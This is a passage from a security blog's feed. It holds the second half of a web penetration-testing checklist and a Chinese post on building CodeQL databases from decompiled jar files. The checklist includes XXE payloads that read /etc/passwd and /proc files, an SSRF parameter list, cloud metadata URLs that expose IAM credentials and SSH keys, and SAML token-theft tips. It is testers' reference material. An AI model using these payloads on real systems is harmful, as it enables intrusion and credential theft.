session</li><li style="list-style: none"><input type="checkbox"> CSRF token is tied to a non-session cookie</li><li style="list-style: none"><input type="checkbox"> Validation of Referer depends on header being present</li></ul></li><li><p><strong>SSO Vulnerabilities</strong></p><ul><li style="list-style: none"><input type="checkbox"> If <a href="http://internal.company.com" target="_blank" rel="noopener">internal.company.com</a> Redirects You To SSO e.g. <a href="http://auth.company.com" target="_blank" rel="noopener">auth.company.com</a>, Do FUZZ On <a href="http://Internal.company.com" target="_blank" rel="noopener">Internal.company.com</a></li><li style="list-style: none"><input type="checkbox"> If <a href="http://company.com/internal" target="_blank" rel="noopener">company.com/internal</a> Redirects You To SSO e.g. Google login, Try To Insert public Before internal e.g. <a href="http://company.com/public/internal" target="_blank" rel="noopener">company.com/public/internal</a> To Gain Access Internal</li><li style="list-style: none"><input type="checkbox"> Try To Craft SAML Request With Token And Send It To The Server And Figure Out How Server Interact With This</li><li style="list-style: none"><input type="checkbox"> If There Is AssertionConsumerServiceURL In Token Request Try To Insert Your Domain e.g. <a href="http://me.com" target="_blank" rel="noopener">http://me.com</a> As Value To Steal The Token</li><li style="list-style: none"><input type="checkbox"> If There Is AssertionConsumerServiceURL In Token Request Try To Do FUZZ On Value Of AssertionConsumerServiceURL If It Is Not Similar To Origin</li><li style="list-style: none"><input type="checkbox"> If There Is Any UUID, Try To Change It To UUID Of Victim Attacker e.g. Email Of Internal Employee Or Admin Account etc</li><li style="list-style: none"><input type="checkbox"> Try To Figure Out If The Server Vulnerable To XML Signature Wrapping OR Not?</li><li style="list-style: none"><input type="checkbox"> Try To Figure Out If The Server Checks The Identity Of The Signer OR Not?</li><li style="list-style: none"><input type="checkbox"> Try To Inject XXE Payloads At The Top Of The SAML Response</li><li style="list-style: none"><input type="checkbox"> Try To Inject XSLT Payloads Into The Transforms Element As A Child Node Of The SAML Response</li><li style="list-style: none"><input type="checkbox"> If Victim Can Accept Tokens Issued By The Same Identity Provider That Services Attacker, So You Can Takeover Victim Account</li><li style="list-style: none"><input type="checkbox"> While Testing SSO Try To search In Burp Suite About URLs In Cookie Header e.g. Host=IP; If There Is Try To Change IP To Your IP To Get SSRF</li></ul></li><li><p><strong>XML Injection Testing</strong></p><ul><li style="list-style: none"><input type="checkbox"> Change the content type to text/xml then insert below code. Check via repeater</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO 8859 1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE tushar [</span><br><span class="line">&lt;!ELEMENT tushar ANY</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;tushar&gt;&amp;xxe;&lt;/</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/hosts&quot; &gt;]&gt;&lt;tushar&gt;&amp;xxe;&lt;/</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///proc/self/cmdline&quot; &gt;]&gt;&lt;tushar&gt;&amp;xxe;&lt;/</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///proc/version&quot; &gt;]&gt;&lt;tushar&gt;&amp;xxe;&lt;/</span><br></pre></td></tr></table></figure><ul><li style="list-style: none"><input type="checkbox"> Blind XXE with out-of-band interaction</li></ul></li><li><p><strong>Cross-origin resource sharing (CORS)</strong></p><ul><li style="list-style: none"><input type="checkbox"> Errors parsing Origin headers</li><li style="list-style: none"><input type="checkbox"> Whitelisted null origin value</li></ul></li><li><p><strong>Server-side request forgery (SSRF)</strong></p><ul><li><p>Common injection parameters</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&quot;access=&quot;, </span><br><span class="line">&quot;admin=&quot;, </span><br><span class="line">&quot;dbg=&quot;, </span><br><span class="line">&quot;debug=&quot;, </span><br><span class="line">&quot;edit=&quot;, </span><br><span class="line">&quot;grant=&quot;, </span><br><span class="line">&quot;test=&quot;, </span><br><span class="line">&quot;alter=&quot;, </span><br><span class="line">&quot;clone=&quot;, </span><br><span class="line">&quot;create=&quot;, </span><br><span class="line">&quot;delete=&quot;, </span><br><span class="line">&quot;disable=&quot;, </span><br><span class="line">&quot;enable=&quot;, </span><br><span class="line">&quot;exec=&quot;, </span><br><span class="line">&quot;execute=&quot;, </span><br><span class="line">&quot;load=&quot;, </span><br><span class="line">&quot;make=&quot;, </span><br><span class="line">&quot;modify=&quot;, </span><br><span class="line">&quot;rename=&quot;, </span><br><span class="line">&quot;reset=&quot;, </span><br><span class="line">&quot;shell=&quot;, </span><br><span class="line">&quot;toggle=&quot;, </span><br><span class="line">&quot;adm=&quot;, </span><br><span class="line">&quot;root=&quot;, </span><br><span class="line">&quot;cfg=&quot;,</span><br><span class="line">&quot;dest=&quot;, </span><br><span class="line">&quot;redirect=&quot;, </span><br><span class="line">&quot;uri=&quot;, </span><br><span class="line">&quot;path=&quot;, </span><br><span class="line">&quot;continue=&quot;, </span><br><span class="line">&quot;url=&quot;, </span><br><span class="line">&quot;window=&quot;, </span><br><span class="line">&quot;next=&quot;, </span><br><span class="line">&quot;data=&quot;, </span><br><span class="line">&quot;reference=&quot;, </span><br><span class="line">&quot;site=&quot;, </span><br><span class="line">&quot;html=&quot;, </span><br><span class="line">&quot;val=&quot;, </span><br><span class="line">&quot;validate=&quot;, </span><br><span class="line">&quot;domain=&quot;, </span><br><span class="line">&quot;callback=&quot;, </span><br><span class="line">&quot;return=&quot;, </span><br><span class="line">&quot;page=&quot;, </span><br><span class="line">&quot;feed=&quot;, </span><br><span class="line">&quot;host=&quot;, </span><br><span class="line">&quot;port=&quot;, </span><br><span class="line">&quot;to=&quot;, </span><br><span class="line">&quot;out=&quot;,</span><br><span class="line">&quot;view=&quot;, </span><br><span class="line">&quot;dir=&quot;, </span><br><span class="line">&quot;show=&quot;, </span><br><span class="line">&quot;navigation=&quot;, </span><br><span class="line">&quot;open=&quot;,</span><br><span class="line">&quot;file=&quot;,</span><br><span class="line">&quot;document=&quot;,</span><br><span class="line">&quot;folder=&quot;,</span><br><span class="line">&quot;pg=&quot;,</span><br><span class="line">&quot;php_path=&quot;,</span><br><span class="line">&quot;style=&quot;,</span><br><span class="line">&quot;doc=&quot;,</span><br><span class="line">&quot;img=&quot;,</span><br><span class="line">&quot;filename=&quot;</span><br></pre></td></tr></table></figure></li><li><p>[ ] Try basic localhost payloads</p></li><li><p>Bypassing filters</p><ul><li style="list-style: none"><input type="checkbox"> Bypass using HTTPS</li><li style="list-style: none"><input type="checkbox"> Bypass with [::]</li><li style="list-style: none"><input type="checkbox"> Bypass with a domain redirection</li><li style="list-style: none"><input type="checkbox"> Bypass using a decimal IP location</li><li style="list-style: none"><input type="checkbox"> Bypass using IPv6/IPv4 Address Embedding</li><li style="list-style: none"><input type="checkbox"> Bypass using malformed urls</li><li style="list-style: none"><input type="checkbox"> Bypass using rare address(short-hand IP addresses by dropping the zeros)</li><li style="list-style: none"><input type="checkbox"> Bypass using enclosed alphanumerics</li></ul></li><li><p>Cloud Instances</p><ul><li><p>AWS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;http://instance-data&gt;</span><br><span class="line">&lt;http://169.254.169.254&gt;</span><br><span class="line">&lt;http://169.254.169.254/latest/user-data&gt;</span><br><span class="line">&lt;http://169.254.169.254/latest/user-data/iam/security-credentials/&gt;[ROLE NAME]</span><br><span class="line">&lt;http://169.254.169.254/latest/meta-data/&gt;</span><br><span class="line">&lt;http://169.254.169.254/latest/meta-data/iam/security-credentials/&gt;[ROLE NAME]</span><br><span class="line">&lt;http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance&gt;</span><br><span class="line">&lt;http://169.254.169.254/latest/meta-data/ami-id&gt;</span><br><span class="line">&lt;http://169.254.169.254/latest/meta-data/reservation-id&gt;</span><br><span class="line">&lt;http://169.254.169.254/latest/meta-data/hostname&gt;</span><br><span class="line">&lt;http://169.254.169.254/latest/meta-data/public-keys/&gt;</span><br><span class="line">&lt;http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key&gt;</span><br><span class="line">&lt;http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key&gt;</span><br><span class="line">&lt;http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy&gt;</span><br><span class="line">&lt;http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access&gt;</span><br><span class="line">&lt;http://169.254.169.254/latest/dynamic/instance-identity/document&gt;</span><br></pre></td></tr></table></figure></li><li><p>Google Cloud</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;http://169.254.169.254/computeMetadata/v1/&gt;</span><br><span class="line">&lt;http://metadata.google.internal/computeMetadata/v1/&gt;</span><br><span class="line">&lt;http://metadata/computeMetadata/v1/&gt;</span><br><span class="line">&lt;http://metadata.google.internal/computeMetadata/v1/instance/hostname&gt;</span><br><span class="line">&lt;http://metadata.google.internal/computeMetadata/v1/instance/id&gt;</span><br><span class="line">&lt;http://metadata.google.internal/computeMetadata/v1/project/project-id&gt;</span><br></pre></td></tr></table></figure></li><li><p>Digital Ocean</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl &lt;http://169.254.169.254/metadata/v1/id&gt;</span><br><span class="line">&lt;http://169.254.169.254/metadata/v1.json&gt;</span><br><span class="line">&lt;http://169.254.169.254/metadata/v1/&gt; </span><br><span class="line">&lt;http://169.254.169.254/metadata/v1/id&gt;</span><br><span class="line">&lt;http://169.254.169.254/metadata/v1/user-data&gt;</span><br><span class="line">&lt;http://169.254.169.254/metadata/v1/hostname&gt;</span><br><span class="line">&lt;http://169.254.169.254/metadata/v1/region&gt;</span><br><span class="line">&lt;http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address&gt;</span><br></pre></td></tr></table></figure></li><li><p>Azure</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;http://169.254.169.254/metadata/v1/maintenance&gt;</span><br><span class="line">&lt;http://169.254.169.254/metadata/instance?api-version=2017-04-02&gt;</span><br><span class="line">&lt;http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&amp;format=text&gt;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>[ ] Bypassing via open redirection</p></li></ul></li><li><p><strong>File Upload Testing</strong></p><ul><li style="list-style: none"><input type="checkbox"> upload the malicious file to the archive upload functionality and observe how the application responds</li><li style="list-style: none"><input type="checkbox"> upload a file and change its path to overwrite an existing system file</li><li style="list-style: none"><input type="checkbox"> Large File Denial of Service</li><li style="list-style: none"><input type="checkbox"> Metadata Leakage</li><li style="list-style: none"><input type="checkbox"> ImageMagick Library Attacks</li><li style="list-style: none"><input type="checkbox"> Pixel Flood Attack</li><li>Bypasses<ul><li style="list-style: none"><input type="checkbox"> Null Byte (%00) Bypass</li><li style="list-style: none"><input type="checkbox"> Content-Type Bypass</li><li style="list-style: none"><input type="checkbox"> Magic Byte Bypass</li><li style="list-style: none"><input type="checkbox"> Client-Side Validation Bypass</li><li style="list-style: none"><input type="checkbox"> Blacklisted Extension Bypass</li><li style="list-style: none"><input type="checkbox"> Homographic Character Bypass</li></ul></li></ul></li><li><p><strong>CAPTCHA Testing</strong></p><ul><li style="list-style: none"><input type="checkbox"> Missing Captcha Field Integrity Checks</li><li style="list-style: none"><input type="checkbox"> HTTP Verb Manipulation</li><li style="list-style: none"><input type="checkbox"> Content Type Conversion</li><li style="list-style: none"><input type="checkbox"> Reusuable Captcha</li><li style="list-style: none"><input type="checkbox"> Check if captcha is retrievable with the absolute path such as <a href="http://www.chintan.com/internal/captcha/images/24.png" target="_blank" rel="noopener">www.tushar.com/internal/captcha/images/24.png</a></li><li style="list-style: none"><input type="checkbox"> Check for the server side validation for CAPTCHA.Remove captcha block from GUI using firebug addon and submit request to the server</li><li style="list-style: none"><input type="checkbox"> Check if image recognition can be done with OCR tool?</li></ul></li><li><p><strong>JWT Token Testing</strong></p><ul><li style="list-style: none"><input type="checkbox"> Brute-forcing secret keys</li><li style="list-style: none"><input type="checkbox"> Signing a new token with the “none” algorithm</li><li style="list-style: none"><input type="checkbox"> Changing the signing algorithm of the token (for fuzzing purposes)</li><li style="list-style: none"><input type="checkbox"> Signing the asymmetrically-signed token to its symmetric algorithm match (when you have the original public key)</li></ul></li><li><p><strong>Websockets Testing</strong></p><ul><li style="list-style: none"><input type="checkbox"> Intercepting and modifying WebSocket messages</li><li style="list-style: none"><input type="checkbox"> Websockets MITM attempts</li><li style="list-style: none"><input type="checkbox"> Testing secret header websocket</li><li style="list-style: none"><input type="checkbox"> Content stealing in websockets</li><li style="list-style: none"><input type="checkbox"> Token authentication testing in websockets</li></ul></li><li><p><strong>GraphQL Vulnerabilities Testing</strong></p><ul><li style="list-style: none"><input type="checkbox"> Inconsistent Authorization Checks</li><li style="list-style: none"><input type="checkbox"> Missing Validation of Custom Scalars</li><li style="list-style: none"><input type="checkbox"> Failure to Appropriately Rate-limit</li><li style="list-style: none"><input type="checkbox"> Introspection Query Enabled/Disabled</li></ul></li><li><p><strong>WordPress Common Vulnerabilities</strong></p><ul><li style="list-style: none"><input type="checkbox"> XSPA in wordpress</li><li style="list-style: none"><input type="checkbox"> Bruteforce in wp-login.php</li><li style="list-style: none"><input type="checkbox"> Information disclosure wordpress username</li><li style="list-style: none"><input type="checkbox"> Backup file wp-config exposed</li><li style="list-style: none"><input type="checkbox"> Log files exposed</li><li style="list-style: none"><input type="checkbox"> Denial of Service via load-styles.php</li><li style="list-style: none"><input type="checkbox"> Denial of Service via load-scripts.php</li><li style="list-style: none"><input type="checkbox"> DDOS using xmlrpc.php</li></ul></li><li><p><strong>Denial of Service</strong></p><ul><li style="list-style: none"><input type="checkbox"> Cookie bomb</li><li style="list-style: none"><input type="checkbox"> Pixel flood, using image with a huge pixels</li><li style="list-style: none"><input type="checkbox"> Frame flood, using GIF with a huge frame</li><li style="list-style: none"><input type="checkbox"> ReDoS (Regex DoS)</li><li style="list-style: none"><input type="checkbox"> CPDoS (Cache Poisoned Denial of Service)</li></ul></li><li><p><strong>Other Test Cases (All Categories)</strong></p><ul><li>Testing for Role authorization<ul><li style="list-style: none"><input type="checkbox"> Check if normal user can access the resources of high privileged users?</li><li style="list-style: none"><input type="checkbox"> Forced browsing</li><li style="list-style: none"><input type="checkbox"> Insecure direct object reference</li><li style="list-style: none"><input type="checkbox"> Parameter tampering to switch user account to high privileged user</li></ul></li><li>Check for security headers and at least<ul><li style="list-style: none"><input type="checkbox"> X Frame Options</li><li style="list-style: none"><input type="checkbox"> X-XSS header</li><li style="list-style: none"><input type="checkbox"> HSTS header</li><li style="list-style: none"><input type="checkbox"> CSP header</li><li style="list-style: none"><input type="checkbox"> Referrer Policy</li><li style="list-style: none"><input type="checkbox"> Cache Control</li><li style="list-style: none"><input type="checkbox"> Public key pins</li></ul></li><li>Blind OS command injection<ul><li style="list-style: none"><input type="checkbox"> using time delays</li><li style="list-style: none"><input type="checkbox"> by redirecting output</li><li style="list-style: none"><input type="checkbox"> with out-of-band interaction</li><li style="list-style: none"><input type="checkbox"> with out-of-band data exfiltration</li></ul></li><li style="list-style: none"><input type="checkbox"> Command injection on CSV export (Upload/Download)</li><li style="list-style: none"><input type="checkbox"> CSV Excel Macro Injection</li><li style="list-style: none"><input type="checkbox"> If you find phpinfo.php file, check for the configuration leakage and try to exploit any network vulnerability.</li><li style="list-style: none"><input type="checkbox"> Parameter Pollution Social Media Sharing Buttons</li><li>Broken Cryptography<ul><li style="list-style: none"><input type="checkbox"> Cryptography Implementation Flaw</li><li style="list-style: none"><input type="checkbox"> Encrypted Information Compromised</li><li style="list-style: none"><input type="checkbox"> Weak Ciphers Used for Encryption</li></ul></li><li>Web Services Testing<ul><li style="list-style: none"><input type="checkbox"> Test for directory traversal</li><li style="list-style: none"><input type="checkbox"> Web services documentation disclosure Enumeration of services, data types, input types boundaries and limits</li></ul></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SecCheckList&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://www.sys71m.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透" scheme="https://www.sys71m.top/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL如何分析闭源jar包</title>
    <link href="https://www.sys71m.top/2022/08/20/CodeQL%E5%A6%82%E4%BD%95%E5%88%86%E6%9E%90%E9%97%AD%E6%BA%90jar%E5%8C%85/"/>
    <id>https://www.sys71m.top/2022/08/20/CodeQL%E5%A6%82%E4%BD%95%E5%88%86%E6%9E%90%E9%97%AD%E6%BA%90jar%E5%8C%85/</id>
    <published>2022-08-20T14:47:18.000Z</published>
    <updated>2022-08-20T14:53:53.184Z</updated>
    
    <content type="html"><![CDATA[<p>CodeQL分析jar包的一种思路和测试</p><a id="more"></a>  <p>Jar文件是java代码编译后产物，聚合大量的Java类文件、相关的元数据和资源（文本、图片等）文件到一个文件，以便分发Java平台应用软件或库。</p><p>如果CodeQL需要分析jar文件，可以通过反编译得到项目源码，后续再通过javac等编译命令生成CodeQL数据库。理论可行，实践开始。</p><p>脚本工具：<a href="https://github.com/ttonys/CodeQLAnalyseJar" target="_blank" rel="noopener">https://github.com/ttonys/CodeQLAnalyseJar</a></p><h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><p>反编译工具：</p><ul><li><p>Jd-gui：下载地址：<a href="http://java-decompiler.github.io/" target="_blank" rel="noopener">Java Decompiler (java-decompiler.github.io)</a></p></li><li><p>fernflower，类似java-decompiler，下载地址：<a href="http://the.bytecode.club/fernflower.jar，Git：https://github.com/fesh0r/fernflower" target="_blank" rel="noopener">http://the.bytecode.club/fernflower.jar，Git：https://github.com/fesh0r/fernflower</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar fernflower.jar -dgs=true java-sec-code-1.0.0.jar ./dist</span><br></pre></td></tr></table></figure></li><li><p>cfr：下载地址：<a href="https://github.com/leibnitz27/cfrCFR" target="_blank" rel="noopener">https://github.com/leibnitz27/cfrCFR</a></p></li><li><p>java-decompiler：idea自带的反编译工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=true ../target/java-sec-code-1.0.0.jar out</span><br></pre></td></tr></table></figure></li><li><p>procyon：下载地址：<a href="https://github.com/mstrobel/procyon" target="_blank" rel="noopener">https://github.com/mstrobel/procyon</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar procyon-decompiler-0.6.0.jar -jar java-sec-code-1.0.0.jar -o java-sec-decode</span><br></pre></td></tr></table></figure></li></ul><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>编译工具：</p><ul><li>Javac：不推荐。容易报错，会终止数据库生成</li><li>ant：<a href="https://www.w3cschool.cn/ant/" target="_blank" rel="noopener">Apache Ant 教程_w3cschool</a>  下载地址：<a href="https://ant.apache.org/" target="_blank" rel="noopener">https://ant.apache.org/</a></li><li>ecj：eclipse构建工具</li></ul><h2 id="数据库构建流程"><a href="#数据库构建流程" class="headerlink" title="数据库构建流程"></a>数据库构建流程</h2><p><strong><em>jar包反编译再编译过程中，会存在报错，对codeql分析有一定影响，但实测依然可以检测漏洞。</em></strong></p><p>经过本地测试，选定反编译工具为<code>procyon</code>和<code>java-decompiler</code>，编译工具选择<code>ant</code></p><p>思路：</p><p>1、使用procyon反编译jar得到java文件，结果比较符合源码。</p><p>2、使用java-decompiler反编译jar得到lib文件，里面包含构建所需jar包</p><p>3、编写build.xml文件，使用ant进行编译，运行<code>ant -f build.xml</code>格式如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">name</span>=<span class="string">"fax"</span> <span class="attr">basedir</span>=<span class="string">"."</span> <span class="attr">default</span>=<span class="string">"build"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"src.dir"</span> <span class="attr">value</span>=<span class="string">"src"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"web.dir"</span> <span class="attr">value</span>=<span class="string">"BOOT-INF"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"build.dir"</span> <span class="attr">value</span>=<span class="string">"$&#123;web.dir&#125;/classes"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"fax"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"tomcat.home"</span> <span class="attr">value</span>=<span class="string">"/Users/sys71m/Downloads/apache-tomcat-10.0.23"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">path</span> <span class="attr">id</span>=<span class="string">"master-classpath"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">fileset</span> <span class="attr">dir</span>=<span class="string">"$&#123;web.dir&#125;/lib"</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">include</span> <span class="attr">name</span>=<span class="string">"*.jar"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">fileset</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">pathelement</span> <span class="attr">path</span>=<span class="string">"$&#123;build.dir&#125;"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">target</span> <span class="attr">name</span>=<span class="string">"build"</span> <span class="attr">description</span>=<span class="string">"Compile source tree java files"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">mkdir</span> <span class="attr">dir</span>=<span class="string">"$&#123;build.dir&#125;"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">javac</span> <span class="attr">destdir</span>=<span class="string">"$&#123;build.dir&#125;"</span> </span></span><br><span class="line"><span class="tag">         <span class="attr">source</span>=<span class="string">"1.8"</span> <span class="attr">target</span>=<span class="string">"1.8"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">optimize</span>=<span class="string">"off"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">debug</span>=<span class="string">"on"</span> <span class="attr">failonerror</span>=<span class="string">"false"</span></span></span><br><span class="line"><span class="tag">         &gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">src</span> <span class="attr">path</span>=<span class="string">"$&#123;src.dir&#125;"</span>/&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">classpath</span> <span class="attr">refid</span>=<span class="string">"master-classpath"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">javac</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">target</span> <span class="attr">name</span>=<span class="string">"clean"</span> <span class="attr">description</span>=<span class="string">"Clean output directories"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">delete</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">fileset</span> <span class="attr">dir</span>=<span class="string">"$&#123;build.dir&#125;"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">include</span> <span class="attr">name</span>=<span class="string">"**/*.class"</span>/&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">fileset</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">fileset</span> <span class="attr">dir</span>=<span class="string">"$&#123;tomcat.home&#125;/lib"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">include</span> <span class="attr">name</span>=<span class="string">"*.jar"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">fileset</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">fileset</span> <span class="attr">dir</span>=<span class="string">"$&#123;tomcat.home&#125;/bin"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">include</span> <span class="attr">name</span>=<span class="string">"*.jar"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">fileset</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">delete</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul><li>在ant编译过程中，通过设置<code>failonerror</code>来确保及时部分文件报错也不会终止编译过程。</li><li><code>procyon</code>和<code>java-decompiler</code>得到的java源码会有所不同，可以通过替换报错java文件的方式来使编译结果最优。</li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://paper.seebug.org/1324/" target="_blank" rel="noopener">https://paper.seebug.org/1324/</a></li><li><a href="https://github.com/ice-doom/codeql_compile" target="_blank" rel="noopener">https://github.com/ice-doom/codeql_compile</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CodeQL分析jar包的一种思路和测试&lt;/p&gt;
    
    </summary>
    
    
      <category term="CodeQL" scheme="https://www.sys71m.top/categories/CodeQL/"/>
    
    
      <category term="Java" scheme="https://www.sys71m.top/tags/Java/"/>
    
      <category term="CodeQL" scheme="https://www.sys71m.top/tags/CodeQL/"/>
    
      <category term="SAST" scheme="https://www.sys71m.top/tags/SAST/"/>
    
  </entry>
  
  <entry>
    <title>ASM使用小结01</title>
    <link href="https://www.sys71m.top/2022/03/23/ASM%E4%BD%BF%E7%94%A8%E5%B0%8F%E7%BB%9301/"/>
